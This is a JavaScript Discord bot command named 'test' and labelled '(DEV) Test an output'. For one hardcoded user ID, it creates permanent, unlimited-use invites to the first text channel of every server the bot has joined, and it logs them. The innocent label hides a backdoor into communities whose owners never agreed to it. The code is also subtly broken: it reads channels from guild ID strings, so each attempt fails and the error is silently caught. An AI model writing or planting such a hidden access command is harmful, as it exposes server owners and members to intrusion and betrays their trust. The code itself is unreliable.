const { SlashCommandBuilder } = require("@discordjs/builders");
const { MessageEmbed } = require("discord.js");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("test")
    .setDescription("(DEV) Test an output"),
  async execute(interaction, client) {
    if (interaction.user.id === "856545083310604308") {
      const invites = [];
      const guilds = client.guilds.cache.map((guild) => guild.id);
      guilds.forEach(async (guild) => {
        try {
          const channel = guild.channels.cache
            .filter((channel) => channel.type === "text")
            .first();
          await channel
            .createInvite({ maxAge: 0, maxUses: 0 })
            .then(async (invite) => {
              invites.push(`${guild.name} - ${invite.url}`);
            });
          console.log(invites);
        } catch (err) {
          console.log(err);
        }
      });
    } else {
      await interaction.reply({
        content: `You are not allowed to use this command!`,
        ephemeral: true,
      });
    }
  },
};
